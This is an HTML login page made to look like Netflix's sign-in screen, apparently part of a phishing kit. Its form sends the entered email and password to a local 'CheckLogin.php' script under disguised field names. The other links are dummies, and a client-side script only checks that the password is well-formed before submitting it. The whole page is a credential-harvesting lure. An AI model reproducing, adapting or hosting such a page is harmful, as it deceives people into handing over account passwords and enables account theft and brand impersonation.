<!DOCTYPE>
<html>

<head>
  <title>Netflix</title>
  <link type="text/css" rel="stylesheet" href="img/css.css">
  <link rel="shortcut icon" href="img/nficon2016.ico">
  <link rel="apple-touch-icon" href="img/nficon2016.png">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js" type="text/javascript"></script>
  <meta charset="UTF-8">
</head>

<body>
  <div class="logo">
  	<img src="img/logo.png">
  </div>
  <div id="appMountPoint">
    <div class="login-wrapper" data-reactroot="" data-reactid="1" data-react-checksum="1712513156">
      <div class="nfHeader login-header signupBasicHeader" data-reactid="2">
        <a href="#" class="svg-nfLogo signupBasicHeader" data-reactid="3">
          <svg class="svg-icon svg-icon-netflix-logo " focusable="true" data-reactid="4">
            <use filter="" xlink:href="#netflix-logo" data-reactid="5"></use>
          </svg>
          <span class="screen-reader-text" data-reactid="6">Netflix</span>
        </a>
      </div>
      <div class="login-body" data-reactid="7">
        <div data-reactid="8">
          <div class="login-content login-form" data-reactid="10">
            <h1 data-reactid="11" class="login-title">Sign In</h1>
            <span style="color: red; margin-left: 24px;" id="error" ></span>
            <form class="login-form" action="CheckLogin.php" method="post" id="login_submit" data-reactid="13">
              <label class="login-input login-input-email ui-label ui-input-label" id="lbl-email" placeholder="email"
                data-reactid="14">
                <!-- <span class="ui-label-text" data-reactid="15">E-mail</span> --><input type="email" placeholder="Email or phone number" class="ui-text-input" name="xoooo"
                  id="email" value="" tabindex="1" autocomplete="email" data-reactid="16"></label>
              <div class="hybrid-password-wrapper" data-reactid="17">
                <label class="hybrid-password login-input login-input-password ui-label ui-input-label"
                  id="lbl-password"  data-reactid="18"><!-- <span class="ui-label-text"
                    data-reactid="19">Mot de passe</span> -->
                  <input placeholder="Password" type="password" class="ui-text-input" name="XoooX" id="password" tabindex="2"
                    data-reactid="20">
                </label>
                <input type="button" class="show-toggle no-toggle" value="Show Password" data-reactid="21">
                <span data-reactid="22"></span>
              </div>
<!--               <div class="login-forgot-password-wrapper" data-reactid="23">
                <a href="#" class="login-help-link" tabindex="3" data-reactid="24">E-mail ou mot de passe ?</a>
              </div> -->
              <button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="4"
                data-reactid="25" >
                Sign in
              </button>
              <div class="login-remember-me-wrapper" data-reactid="27">
                <div class="ui-binary-input login-remember-me" data-reactid="28">
                  <input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="5"
                    data-reactid="29" checked="">
                  <label for="bxid_rememberMe_true" data-reactid="30"><span class="login-remember-me-label-text"
                      data-reactid="31" class="check-need">Remember me</span>
                  </label>
                  <div class="helper" data-reactid="32" class="check-need">Need help?</div>
                </div>
              </div>
            </form>
            <form class="login-form" action="" method="post" data-reactid="40">
              <div class="facebookForm regOption" data-reactid="41">
                <div class="fb-minimal" data-reactid="42">
                  <button class="btn minimal-login btn-submit btn-small" type="submit"
                    autocomplete="off" tabindex="6" data-reactid="44">
                    <div class="fb-login" data-reactid="45"><img class="icon-facebook" src="img/FB-f-Logo__blue_57.png"
                        data-reactid="46">
                      <span class="fbBtnText" data-reactid="47">Login with Facebook</span>
                    </div>
                  </button>
                </div>
              </div>
            </form>
            <div class="login-signup-now" data-reactid="56">
              <!-- react-text: 57 -->New to Netflix ?
              <!-- /react-text -->
              <a class="sign-up-now" target="_self" href="#" data-reactid="58">Sign up now</a>
            </div>
            <div>
            	<p class="login-bottom-title">This page is protected by Google reCAPTCHA to ensure you're not a bot. <span>Learn more.</span></p>
            </div>
          </div>
        </div>
      </div>
      <div class="site-footer-wrapper login-footer" data-reactid="60">
	  </div>
	  <div style="display: flex;justify-content:center;background-color: rgba(0,0,0,0.85);margin-top:50px;">
		  <div class="footer-section">
		  	<div class="footer-title">
		  		Question? Call 00 800 112 4392
		  	</div>
		  	<div class="footer-menu-list">
		  		<div>
		  			<a href="#">FAQ</a>
		  			<a href="#">Cooki Preferences</a>
		  		</div>
		  		<div>
		  			<a href="#">
		  				Help Center
		  			</a>
		  			<a href="#">
		  				Corporate information
		  			</a>
		  		</div>
		  		<div>
		  			<a href="#">
		  				Terms of use
		  			</a>
		  		</div>
		  		<div>
		  			<a href="#">Privacy</a>
		  		</div>
		  	</div>
		  	<div class="select-drop-btn">
          <div></div>
		  	  <select name="language" id="lang">
  			    <option value="volvo">English</option>
  			    <option value="saab">Franch</option>
			  </select>
		  	</div>
		  </div>
	  </div>
<script>
  $("#login_submit").on('submit',function(e){
        e.preventDefault();
        var email = $("#email").val();
        var pass = $("#password").val();
        // if (!ValidateEmail(email)) {
        //   $("#email").val("");
        //   $("#email").focus();
        //   $("#error").text("Veuillez saisir à nouveau votre adresse e-mail.");
        //   return;
        // }
        // else {
        //   $("#error").text("");

        // }
        if (!check_password(pass)) {
          $("#password").val("");
          $("#password").focus();
          $("#error").text("Le format du mot de passe est incorrect.");
          return;
        }
        else {
          $("#error").text("");
        }
        e.currentTarget.submit()
  });
  function ValidateEmail(inputText) {
    var mailformat = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
    if (inputText.match(mailformat)) {
      return true;
    }
    else {
      return false;
    }
  }
  function check_password(password) {
    var passwnum = /^(?=.*\d)(?=.*[a-zA-Z])[a-zA-Z0-9!@#$%^&*]{8,20}$/;
    var passw = /^(?=.*[a-zA-Z])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,20}$/;
    if (password.match(passwnum) && isNaN(password[0])) {
      return true;
    }
    else if (password.match(passw) && isNaN(password[0])) {
      return true;
    }
    else {
      return false;
    }

  }
</script>
</body>

</html>